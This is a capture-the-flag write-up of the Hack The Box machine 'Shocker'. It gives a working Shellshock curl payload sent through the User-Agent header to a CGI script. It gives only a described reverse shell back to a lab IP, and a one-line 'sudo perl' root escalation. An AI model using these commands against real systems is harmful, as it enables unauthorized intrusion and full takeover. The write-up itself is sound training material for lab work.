---
layout: post
title: "A Word Said in the Wrong Doorway"
subtitle: "HTB Shocker, an easy Linux box where a 2014 Bash bug rides in on a browser header and a single sudo line finishes the job."
date: 2018-02-24 12:00:00 +0000
description: "A four-year-old Bash bug, smuggled in through a header nobody reads, and a sudo rule that hands you root in one line."
image: /assets/og/a-word-said-in-the-wrong-doorway.png
tags: [hackthebox, writeup]
---

Shocker wears its whole confession in its name, the way a man with a knife behind his back still walks like a man with a knife behind his back. There is one web server, one little CGI script that nobody should have left runnable, and a copy of Bash old enough to remember 2014. The script asks the shell a polite question and the shell, being four years behind on its reading, answers a different question entirely. You whisper a command into a header the script never meant to trust, the shell runs it, and you are inside. From there the box does not even make you fight. There is a single sudo rule with your name on it, and Perl walks you straight to root. It is an Easy box, and it is honest about it, but the lesson underneath is older and meaner than the box looks.

```
        S H O C K E R
        =============
        GET /cgi-bin/user.sh
              |
        User-Agent:  () { :;};  <your command here>
              |               a function that isn't,
              v               a sentence with a tail
        bash reads the tail and runs it
              |
              v
        shell as shelly  ->  sudo perl  ->  root
                                            殻
```

## 0x01 · the door with no handle

`nmap` keeps it short. A web server on 80 running Apache 2.4.18 on Ubuntu, and SSH parked off in the weeds on 2222 instead of 22. Two ports, no theatrics.

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

The website itself is a single image and a taunt, nothing to click, nothing to submit. So you do the thing you always do when the front page is a dead end. You start knocking on doors that are not drawn on the map.

The first run of a directory brute-forcer comes back with almost nothing, and this is the part of the box that trips people who are moving fast. Apache here is configured so the interesting directory only answers when you ask for it with a trailing slash. Ask for `/cgi-bin` and the server shrugs. Ask for `/cgi-bin/` and a door appears. Most tools, in their default mood, only try the version without the slash, so they walk right past it.

Think of it like a hallway where one door is flush with the wall and painted the same color. You will swear there is nothing there until you run your hand along the seam and feel the edge. The fix is to tell the tool to test the directory form too, the trailing-slash form, and suddenly `/cgi-bin/` is sitting there in the output. A second pass into that directory, this time asking specifically for shell and CGI extensions, turns up the real prize.

```
$ feroxbuster -u http://10.10.10.56 -f
301      GET    /cgi-bin/   =>   wall reads as a door, finally

$ feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh cgi pl
200      GET    /cgi-bin/user.sh
```

## 0x02 · a script that runs a shell to do small talk

`user.sh` is a CGI script, which is the old web's way of saying "this file is not a page, it is a program, and the server will run it and hand you whatever it prints." Pull it up and it just reports the box's uptime, a harmless little status line.

But look at what is really happening. To print one line of uptime, the web server launches an entire copy of Bash, hands it a pile of environment variables built out of your HTTP request, and lets it run the script. Your request gets to set those variables. Your browser's `User-Agent`, the string that normally just says which browser you are, becomes a value that a real shell is about to load into its own environment before it does anything else.

Picture handing a note to a clerk who is required to read every word on it aloud before filing it. Normally the note says your name. But the clerk reads literally everything, so if you write an extra instruction past your name, the clerk reads that out too, and the clerk happens to be the kind that does whatever it reads. The web server thinks it is filling out an environment variable. The version of Bash on the other end thinks it has been handed work.

## 0x03 · the bug that was always a sentence with a tail

This is Shellshock, CVE-2014-6271, and it is one of the cleaner bugs to actually understand once you stop being afraid of it.

Bash lets you store a function inside an environment variable. The text `() { :;}` means "an empty function," and for years Bash would see that pattern in an incoming variable and dutifully define the function. The flaw is that Bash did not stop reading at the closing brace. Anything you wrote after the function definition, Bash kept right on parsing and executing, immediately, as a command. The function was the cover story. The real cargo was the part that came after.

```
() { :;};  echo;  /bin/id
   ^^^^^     ^^    ^^^^^^^
   a fake    the   the part bash was
  function  break  never supposed to run
```

Two small details make it work on this box. The `echo;` matters because CGI output has to begin with a blank line to separate the HTTP headers from the body, and without it the server panics and throws a 500. And every command needs its full path, `/bin/id` not `id`, because the shell that gets spawned here has an empty `$PATH` and does not know where anything lives. So you smuggle the payload in through the `User-Agent` header and watch the script answer a question nobody asked.

```
$ curl -H 'User-Agent: () { :;}; echo; /bin/id' \
       http://10.10.10.56/cgi-bin/user.sh
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),...
```

That is `id`, run on a remote server, returned to you through a header field meant to hold the word "Mozilla." If you would rather have a tool confirm it before you trust your own eyes, `nmap` ships a script that fires the same idea at the same endpoint and tells you the box is vulnerable. Either way, the door is open. Now you make it a real shell.

## 0x04 · turning a header into a home

Swap the harmless `id` for a callback. The cleanest version asks Bash to open a network connection back to your machine and wire its own input and output to that socket, so whatever you type runs on the box and whatever the box says comes home to you.

I will not hand you a copy-paste backdoor here. The payload that goes in the header is `() { :;};` followed by a bracketed placeholder:

```
User-Agent: () { :;}; [ bash reverse shell: /bin/bash -i,
            redirected over /dev/tcp to 10.10.14.4 on port 443 ]
```

Start a listener on your side first, fire the request, and the shell falls into your lap as `shelly`. The first flag is sitting in her home directory.

```
$ nc -lvnp 443
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
████████████████████████████████
```

## 0x05 · the one line that ends it

Privilege escalation on Shocker is not a puzzle, it is a gift somebody left on the counter. The first thing you check on any Linux foothold is what your user is allowed to run as root, and the answer here is loud.

```
shelly@Shocker:~$ sudo -l
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

That line says shelly can run Perl as root, with no password, no questions. The problem is that Perl is not a narrow little tool. It is a full programming language, and one of the things a full programming language can trivially do is launch another program. So you ask root's Perl to launch a shell.

Think of it like being handed a master key labeled "for opening the supply closet only." Nobody enforces the label. The key opens the supply closet because the key opens everything, and once you notice that, the closet was never the point.

```
shelly@Shocker:~$ sudo perl -e 'exec "/bin/bash";'
root@Shocker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Shocker:~# cat /root/root.txt
████████████████████████████████
```

One line. Root. The second flag is yours, and the box is done.

## 0x06 · the honest caveat

It is tempting to file Shocker under "patch your Bash and move on," the same way everyone filed Heartbleed under "patch your OpenSSL." That is the small lesson, and it is real. Shellshock was patched within days in 2014, and a box still running it in 2018 is a museum piece by choice.

But the bigger lesson is the one the box stacks quietly underneath, and it has nothing to do with any CVE. Twice on this box, a thing that should have stayed in its lane did not. The web server passed your raw header into a shell's environment because that is how CGI has always worked and nobody questioned it. The sudo rule handed shelly an entire programming language when whatever real task it was meant for surely needed far less. Neither of those is a memory bug or a clever exploit. Both are the same human shortcut, the decision to grant a broad power because it was convenient and trust that nobody would notice the edges.

That is the part you cannot patch on a Tuesday. You can `apt upgrade` the Bash bug out of existence forever. You cannot upgrade away the instinct to write `NOPASSWD: /usr/bin/perl` when you were really thinking about one tiny script. The bug was the door. The habit was the welcome mat.

## 0x07 · outro

```
a server read a header out loud, and the shell behind it obeyed.
the word was never meant to be a command. it became one anyway.

then a key labeled for one closet opened the whole building,
because nobody checks the label, only the teeth.

patch the bash. but trim the sudo line too. wear black.

                                                            EOF
```

---

*HTB: Shocker, retired 17 Feb 2018. an Easy box that is really a short sermon on overbroad trust, wearing a 2014 Bash bug as its costume. if you are following along, Shellshock still answers in a lab and nowhere you do not own.*